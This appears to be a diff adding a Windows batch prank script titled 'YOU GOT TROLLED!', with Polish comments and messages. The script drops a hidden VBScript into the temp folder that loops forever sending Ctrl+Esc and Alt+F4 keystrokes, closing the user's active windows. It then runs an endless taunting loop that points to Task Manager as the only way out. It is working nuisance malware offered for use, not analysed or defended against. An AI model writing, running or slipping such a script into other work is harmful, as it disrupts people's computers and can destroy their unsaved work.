@@ -1,0 +1,22 @@
+@echo off
+title YOU GOT TROLLED! ( ͡° ͜ʖ ͡°)
+color 0c
+mode con: cols=50 lines=10
+
+:: Blokada kombinacji klawiszy
+echo Set oShell = CreateObject("WScript.Shell") > %temp%\troll.vbs
+echo Do >> %temp%\troll.vbs
+echo oShell.SendKeys "^{ESC}" >> %temp%\troll.vbs
+echo oShell.SendKeys "%{F4}" >> %temp%\troll.vbs
+echo Loop >> %temp%\troll.vbs
+start /min wscript %temp%\troll.vbs
+
+:: Nieskończona pętla z komunikatem
+:loop
+echo NIE ZAMKNIESZ MNIE TAK LATWO!
+echo ------------------------------
+echo Probujesz nacisnac Alt+F4? To slodkie.
+echo Jedyna droga to: MENEDZER ZADAN (Ctrl+Shift+Esc)
+timeout /t 1 /nobreak >nul
+cls
+goto loop
